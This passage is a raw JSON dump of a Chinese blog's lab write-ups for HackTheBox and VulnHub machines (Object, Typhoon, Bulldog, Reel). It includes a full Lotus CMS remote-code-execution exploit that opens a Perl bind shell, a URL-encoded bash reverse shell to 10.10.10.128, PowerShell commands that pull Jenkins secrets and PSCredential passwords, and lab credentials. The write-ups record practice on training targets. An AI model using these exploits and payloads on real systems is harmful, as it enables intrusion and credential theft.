src=\"/htb_img/WEBRESOURCEb1eac2c59199c4587cbfaaf927ed5325image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003exp_cmd也不让用，只能看看敏感信息了：\u003c/p\u003e\n\u003cp\u003e和user有关的表就三个，查起来很快：\u003c/p\u003e\n\u003cp\u003ejames                J@m3s_P@ssW0rd!\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEddda5b09f0c922d0aa24c2596f1c07e8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再次获得账户名密码，同样的，思路有几个，1、web；2、smb；3、ldap\u003c/p\u003e\n\u003cp\u003esmb看来没什么东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8c13136459512adf64739a76e6190a23image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eweb也登录失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE52f383acbeb2c8257997bae84fd5ccf3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e只剩下ldap了，直接使用bloodhound来看看吧：\u003c/p\u003e\n\u003cp\u003e这个用户是可以登录的，但是没有3389和5689开放啊：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6d0ea9fcab56aac87c67e0825c55b75cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好像也没有什么好的线路了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd55be7a59456eefba8308b1686795c30image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X018 matis"},{"content":"端口扫描 获取立足点 2个http，一个winrm：\n80，改一下hosts:\n发现Jenkins，但是没有密码：\n注册一个就好：\n记录一下，这里利用较为复杂：\n选第一个就行，Freestyle\n最后就可以发现cxk2创建好了：\n获取一个token:\n添加一个项目：\ncurl http://cxk:111925c1dec8a58ad68b891d2c47ce010d@object.htb:8080/job/cxk2/build?token=cxk\n然后点进去就可以看到输出了：\n接下里就是命令执行：\n失败了，好像是说网络错误：\n这里涉及知识盲区：\njenkins的用户信息存放位置：\nc:\\Users\\oliver\\Appdata\\local\\jenkins.jenkins\\users\n然后可以看到admin用户的文件夹：\n读取里面的config.xml文件：\n就可以看到加密的密码：\n详情可以参见：\nhttps://github.com/hoto/jenkins-credentials-decryptor\n上面那个文件，其实是\nmaster.key:\nf673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19\nhudson.util.Secret是二进制文件，使用base64读取出来：\npowershell.exe -c \u0026ldquo;$c=[convert]::ToBase64String((Get-Content -path \u0026lsquo;c:\\Users\\oliver\\Appdata\\local\\jenkins.jenkins\\secrets\\hudson.util.Secret\u0026rsquo; -Encoding byte));Write-Output $c\u0026rdquo;\ngWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=\n最后使用的这个：\nhttps://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py\n得到密码：\nc1cdfun_d2434\n用户名是：oliver\n获取立足点：\n提权 这里脑子卡壳了，以为是防火墙限制了，所以无法上传文件来着，但是实际上可以通过各种方法写入，甚至是winrm可以上传下载文件：\n使用bloodhound就可以成功获取路径了：\n登录成功：\n根据bloodhound的指示，我们可以修改MARIA对象的所有属性：\n但是根据查找，这个属性对于用户的利用方式，一般是修改登录脚本，以获取那个用户的权限：\n这里由于存在防火墙，所以只能我弹我自己了：\n这里其实已经成功执行脚本，弹回来了：\n但是核心问题在于这是一个非交互式的命令行，但是我们可以通过写入文件的方式来获取回显：\n但是根据bloodhound的提示，我们可以使用WriteOwner权限来更改domain admins组的owner，理论上，我们可以直接执ps脚本，达到修改owner为已有用户的情况，但是实际操作发现不知道哪里不对，通过信息收集，在桌面发现一个xls表格：\n最后发现W3llcr4ft3d_4cls是对的：\n接下里就按照bloodhound的指示操作即可：\npowerview害人不浅：\n唯一指定：\nhttps://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\n重新登录即可：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x019-object/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8a4a5bd06cc5b94d2a4c7a4bb86ab5adimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE463dd639cc418cac23c20b51d76fbdffimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2bb8b45352e30d415f216ae75dc4ef15image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e2个http，一个winrm：\u003c/p\u003e\n\u003cp\u003e80，改一下hosts:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf61552d770e37239b793daad390960aaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现Jenkins，但是没有密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0d95232379b880d4f594c14e44e82c81image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e注册一个就好：\u003c/p\u003e\n\u003cp\u003e记录一下，这里利用较为复杂：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE18acfef783a02105d50f29b7627cc67eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e选第一个就行，Freestyle\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE341076286b10660bc98b9d81712b8c3fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd24048db8c3264b0df9274339bd7d30fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9d8b32a4cb933cf5a8507940245f2aa7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd6fb38b188e5c54e893655c43ea7a214image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e最后就可以发现cxk2创建好了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5989113e37e3e91230705d5e9706515fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e获取一个token:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE292e7d59d2112195f79b429607e33003image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e添加一个项目：\u003c/p\u003e\n\u003cp\u003ecurl \u003ca href=\"http://cxk:111925c1dec8a58ad68b891d2c47ce010d@object.htb:8080/job/cxk2/build?token=cxk\"\u003ehttp://cxk:111925c1dec8a58ad68b891d2c47ce010d@object.htb:8080/job/cxk2/build?token=cxk\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf4ddae0037f9c4e6abf55c49acb44dafimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后点进去就可以看到输出了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE75afbb54e1a84516be5f44eb8ae040d7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e接下里就是命令执行：\u003c/p\u003e\n\u003cp\u003e失败了，好像是说网络错误：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb3cbf0a230caceaa0e8e7e2ffc70e134image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里涉及知识盲区：\u003c/p\u003e\n\u003cp\u003ejenkins的用户信息存放位置：\u003c/p\u003e\n\u003cp\u003ec:\\Users\\oliver\\Appdata\\local\\jenkins.jenkins\\users\u003c/p\u003e\n\u003cp\u003e然后可以看到admin用户的文件夹：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE62acc9d58da7e28c97ddba278c03bccaimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e读取里面的config.xml文件：\u003c/p\u003e\n\u003cp\u003e就可以看到加密的密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5894a52362dc6d332dfc3bc3c0a7a3cbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e详情可以参见：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/hoto/jenkins-credentials-decryptor\"\u003ehttps://github.com/hoto/jenkins-credentials-decryptor\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e上面那个文件，其实是\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEcf27eed06a4e20c411325bb133328d47image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003emaster.key:\u003c/p\u003e\n\u003cp\u003ef673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc05251d5c94adab59ea51a062aa689ccimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ehudson.util.Secret是二进制文件，使用base64读取出来：\u003c/p\u003e\n\u003cp\u003epowershell.exe -c \u0026ldquo;$c=[convert]::ToBase64String((Get-Content -path \u0026lsquo;c:\\Users\\oliver\\Appdata\\local\\jenkins.jenkins\\secrets\\hudson.util.Secret\u0026rsquo; -Encoding byte));Write-Output $c\u0026rdquo;\u003c/p\u003e","title":"0X019 object"},{"content":"端口扫描 这次扫描结果太多了，就不看服务扫描结果了，打眼一看全是高危端口\n渗透 21端口：\n80端口 lotuscms成功getshell，应该还有其他洞，感觉洞很多的样子：\n# -*- coding: utf-8 -*-\r#!/usr/bin/python\rimport socket\rimport sys\rimport time\rimport os\rimport base64\rimport urllib\rif len(sys.argv) \u0026lt;= 2:\rprint \u0026#34;\\n EXPLOIT - BIND SHELL\\n\u0026#34;\rprint \u0026#34; - Remote Command Execution -\u0026#34;\rprint \u0026#34; tested on: Lotus CMS 3.0\\n\u0026#34;\rprint \u0026#34; Usage:\u0026#34;\rprint \u0026#34; ./\u0026#34;+sys.argv[0]+\u0026#34; [TARGET IP] [TCP PORT TO OPEN]\u0026#34;\rprint \u0026#34; Example:\u0026#34;\rprint \u0026#34; ./\u0026#34;+sys.argv[0]+\u0026#34; 192.168.10.106 4444\u0026#34;\relse:\rprint \u0026#34;\\n EXPLOIT - BIND SHELL\\n\u0026#34;\rprint \u0026#34; - Remote Command Execution -\u0026#34;\rprint \u0026#34; tested on: Lotus CMS 3.0\\n\u0026#34;\rprint \u0026#34; [*] Generating payload...\u0026#34;\r# Monta o payload\rpayload0=\u0026#34;perl -MIO -e \u0026#39;$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,\u0026#34;+sys.argv[2]+\u0026#34;,Reuse,1,Listen)-\u0026gt;accept;$~-\u0026gt;fdopen($c,w);STDIN-\u0026gt;fdopen($c,r);system$_ while\u0026lt;\u0026gt;\u0026#39;\u0026#34;\r# Encoda em base64\rpayload1 = base64.b64encode(payload0)\r# Junta tudo\rpayload2=\u0026#34;index\u0026#39;);system(base64_decode(\u0026#39;\u0026#34;+payload1+\u0026#34;\u0026#39;));#\u0026#34;\r# Encoda URL\rdata=\u0026#34;page=\u0026#34;+urllib.quote(payload2)\r# Calcula o tamanho do payload\rtam = len(data)\r# Monta header + body do request\rrequest=\u0026#34;POST /cms/index.php HTTP/1.1\\r\\n\u0026#34;\rrequest+=\u0026#34;Host: \u0026#34;+sys.argv[1]+\u0026#34;\\r\\n\u0026#34;\rrequest+=\u0026#34;User-Agent: Mozilla/5.0\\r\\n\u0026#34;\rrequest+=\u0026#34;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#34;\rrequest+=\u0026#34;Content-Length: \u0026#34;+str(tam)+\u0026#34;\\r\\n\u0026#34;\rrequest+=\u0026#34;Connection: close\\r\\n\u0026#34;\rrequest+=\u0026#34;\\r\\n\u0026#34;\rrequest+=str(data)\r# Envia o request\rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rs.connect((sys.argv[1],80))\rs.send(request)\r# Exibe o que enviou\rprint \u0026#34;\\n [*] \u0026#34;+str(len(request))+\u0026#34; bytes sent...\u0026#34;\rprint \u0026#34; [*] Getting bind connection...\\n\u0026#34;\r# Conecta\rtime.sleep(2)\ros.system(\u0026#34;nc -vn \u0026#34;+sys.argv[1]+\u0026#34; \u0026#34;+sys.argv[2]) 提权 redis未授权应该是有的\n有GCC直接内核提权\nCVE-2021-4034\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x019-typhoon-1.02/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEacdbbff87e00e3b1e7c2b593bc9fdd39%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这次扫描结果太多了，就不看服务扫描结果了，打眼一看全是高危端口\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e21端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1fd2eed0df441ab4c9b5033195fe119c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口 lotuscms成功getshell，应该还有其他洞，感觉洞很多的样子：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# -*- coding: utf-8 -*-\r\n#!/usr/bin/python\r\n\r\nimport socket\r\nimport sys\r\nimport time\r\nimport os\r\nimport base64\r\nimport urllib\r\n\r\nif len(sys.argv) \u0026lt;= 2:\r\n        print \u0026#34;\\n      EXPLOIT - BIND SHELL\\n\u0026#34;\r\n        print \u0026#34;   - Remote Command Execution -\u0026#34;\r\n        print \u0026#34;     tested on: Lotus CMS 3.0\\n\u0026#34;\r\n        print \u0026#34; Usage:\u0026#34;\r\n        print \u0026#34; ./\u0026#34;+sys.argv[0]+\u0026#34; [TARGET IP] [TCP PORT TO OPEN]\u0026#34;\r\n        print \u0026#34; Example:\u0026#34;\r\n        print \u0026#34; ./\u0026#34;+sys.argv[0]+\u0026#34; 192.168.10.106 4444\u0026#34;\r\nelse:\r\n        print \u0026#34;\\n      EXPLOIT - BIND SHELL\\n\u0026#34;\r\n        print \u0026#34;   - Remote Command Execution -\u0026#34;\r\n        print \u0026#34;     tested on: Lotus CMS 3.0\\n\u0026#34;\r\n        print \u0026#34; [*] Generating payload...\u0026#34;\r\n\r\n        # Monta o payload\r\n        payload0=\u0026#34;perl -MIO -e \u0026#39;$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,\u0026#34;+sys.argv[2]+\u0026#34;,Reuse,1,Listen)-\u0026gt;accept;$~-\u0026gt;fdopen($c,w);STDIN-\u0026gt;fdopen($c,r);system$_ while\u0026lt;\u0026gt;\u0026#39;\u0026#34;\r\n        # Encoda em base64\r\n        payload1 = base64.b64encode(payload0)\r\n        # Junta tudo\r\n        payload2=\u0026#34;index\u0026#39;);system(base64_decode(\u0026#39;\u0026#34;+payload1+\u0026#34;\u0026#39;));#\u0026#34;\r\n        # Encoda URL\r\n        data=\u0026#34;page=\u0026#34;+urllib.quote(payload2)\r\n        # Calcula o tamanho do payload\r\n        tam = len(data)\r\n\r\n        # Monta header + body do request\r\n        request=\u0026#34;POST /cms/index.php HTTP/1.1\\r\\n\u0026#34;\r\n        request+=\u0026#34;Host: \u0026#34;+sys.argv[1]+\u0026#34;\\r\\n\u0026#34;\r\n        request+=\u0026#34;User-Agent: Mozilla/5.0\\r\\n\u0026#34;\r\n        request+=\u0026#34;Content-Type: application/x-www-form-urlencoded\\r\\n\u0026#34;\r\n        request+=\u0026#34;Content-Length: \u0026#34;+str(tam)+\u0026#34;\\r\\n\u0026#34;\r\n        request+=\u0026#34;Connection: close\\r\\n\u0026#34;\r\n        request+=\u0026#34;\\r\\n\u0026#34;\r\n        request+=str(data)\r\n\r\n        # Envia o request\r\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        s.connect((sys.argv[1],80))\r\n        s.send(request)\r\n\r\n        # Exibe o que enviou\r\n        print \u0026#34;\\n [*] \u0026#34;+str(len(request))+\u0026#34; bytes sent...\u0026#34;\r\n        print \u0026#34; [*] Getting bind connection...\\n\u0026#34;\r\n\r\n        # Conecta\r\n        time.sleep(2)\r\n        os.system(\u0026#34;nc -vn \u0026#34;+sys.argv[1]+\u0026#34; \u0026#34;+sys.argv[2])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf0363f514b3370f3c733d384c145ed7d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x019 Typhoon 1.02"},{"content":"开机改网卡\n端口扫描 WEB渗透 8080和80端口一样的\n发现隐藏信息，疑似账号密码：\nhashcat跑半天，破解hash还是建议使用在线的：\n破解出的密码如下：\nnick@bulldogindustries.com\nbulldog\nsarah@bulldogindustries.com\nbulldoglover\n登录后，成功进去webhell\n阻止危险shell，那我想的就是绕过了：\n记得url编码：\nls|%62%61%73%68%20%2d%63%20%27%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%30%2e%31%32%38%2f%38%38%38%38%20%30%3e%26%31%27\n提权 没什么好说的，前面靶场遇到过的：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x020-bulldog-1-/","summary":"\u003cp\u003e开机改网卡\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb1af1bfc04642d04a8b1255a7ea5659c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE75ec00e2e54007ea720d139649796fcb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eWEB渗透\u003c/h1\u003e\n\u003cp\u003e8080和80端口一样的\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd72212dbd9082666b98fc4bcb6e0b4b7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现隐藏信息，疑似账号密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8ad0d9336fe075a36686c5a354658e3a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ehashcat跑半天，破解hash还是建议使用在线的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE562c0da80a75385e3bbb3d23bed601b8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解出的密码如下：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"http://nick@bulldogindustries.com\"\u003enick@bulldogindustries.com\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003ebulldog\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"mailto:sarah@bulldogindustries.com\"\u003esarah@bulldogindustries.com\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003ebulldoglover\u003c/p\u003e\n\u003cp\u003e登录后，成功进去webhell\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe7be29680457b2caa0f774bf4c6e33eb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e阻止危险shell，那我想的就是绕过了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfe337efad31bbc4536cbdf3a0992fd37%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e记得url编码：\u003c/p\u003e\n\u003cp\u003els|%62%61%73%68%20%2d%63%20%27%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%30%2e%31%32%38%2f%38%38%38%38%20%30%3e%26%31%27\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE35e0246221e6ebaeff9170af631b425b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE43f2f829706792a67ebeda8cd680cfef%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e没什么好说的，前面靶场遇到过的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE158237df7ed2eb7c97cfdc7558d8355f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x020 Bulldog 1 "},{"content":"端口扫描 获取立足点 值得关注的服务：ftp\\ssh\\smb\n先看ftp:\n有匿名登录，发现信息：\n里面的信息大致理解为：\n有程序回记录hash，然后上传到documents下的文件将会被查看，然后是操作记录？\n接着看smb:\nssh目前没有其他信息，就不查看了，研究一下上面写的rtf格式的文件：\n了解了一下，RTF格式的文档也能调用宏来进行攻击：\nhttps://github.com/bhdresh/CVE-2017-0199\n这里的意思是，可以让rtf格式的文档来下载HTA文件执行，hta再进行上线，然后发现前面理解好像有些问题\nFTP并没有上传权限：\n呐意思其实是向文件创建人的邮箱发信息：\n因为25端口开放的：\n配置Empire，生成hta：\n发送邮件：\n成功反弹shell:\n别的不谈，这玩意儿，延迟是真的高：\n提权 当前在域内：\n上bloodhound把：\n不让用：\n继续信息收集，桌面上有一个cred.xml文件\n该文件是 PSCredential 对象当中\n可以通过powershell恢复：\n$credential = import-clixml -path c:\\Users\\nico\\Desktop\\cred.xml;$credential.GetNetworkCredential().username;$credential.GetNetworkCredential().password\n成功获取到了用户名密码：\nTom\n1ts-mag1c!!!\n通过剩下的ssh进行登录：\n奇怪的是，不允许使用其他程序，但是机器上默认存在bloodhound的文件夹：\n下载里面的csv文件，然后筛选当前用户：\n发现tom用户对claire有WriteOwner权限：\n这个用户拥有Backup_Admins组的WriteDacl权限：\n自带的Powerview倒是可以用：\n通过claire有WriteOwner权限，修改权限，修改密码：\n登录claire：\n由于拥有WriteDacl权限，我们可以把自己添加进去：\n当前用户登录进去，发现对admininstrator目录有读取权限：\n直接查看root发现失败：\n但是desktop目录下存在很多东西：\n把所有文件读取，然后丢到文件夹里面就可以查看关键词：\n提权成功：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x020-reel/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb5ad5902eaed1cba670f021c3c57b41eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf16cd19536cd0d56229a8932c3f7ae8dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE507c1c6553aaf03d2f202216cec5e25aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e值得关注的服务：ftp\\ssh\\smb\u003c/p\u003e\n\u003cp\u003e先看ftp:\u003c/p\u003e\n\u003cp\u003e有匿名登录，发现信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc1d9c2f6a55ae6070924f9978eb027a4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e里面的信息大致理解为：\u003c/p\u003e\n\u003cp\u003e有程序回记录hash，然后上传到documents下的文件将会被查看，然后是操作记录？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEebd586d457654b21f2bce6d856aaa0c4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e接着看smb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3c6f18499bb0b6b6ee076a6daddc9565image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003essh目前没有其他信息，就不查看了，研究一下上面写的rtf格式的文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0a2bca99e6897513ee294a0de8e21d5dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e了解了一下，RTF格式的文档也能调用宏来进行攻击：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/bhdresh/CVE-2017-0199\"\u003ehttps://github.com/bhdresh/CVE-2017-0199\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd90abd08c5b1adac77be6fdef6f6c4b6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里的意思是，可以让rtf格式的文档来下载HTA文件执行，hta再进行上线，然后发现前面理解好像有些问题\u003c/p\u003e\n\u003cp\u003eFTP并没有上传权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0ea5c66efa52b80eaf7d75214eb43870image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e呐意思其实是向文件创建人的邮箱发信息：\u003c/p\u003e\n\u003cp\u003e因为25端口开放的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6b042694b831f21a63b58fce782e675dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e配置Empire，生成hta：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEcde94f4bf5107a8e9e9dec93509e6fd9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发送邮件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa71e39f5b5e4387ed9f3b6c3049c4a7cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEcc8fd18eea6201ec71b8dc75fd4e841fimage.png\" alt=\"\"  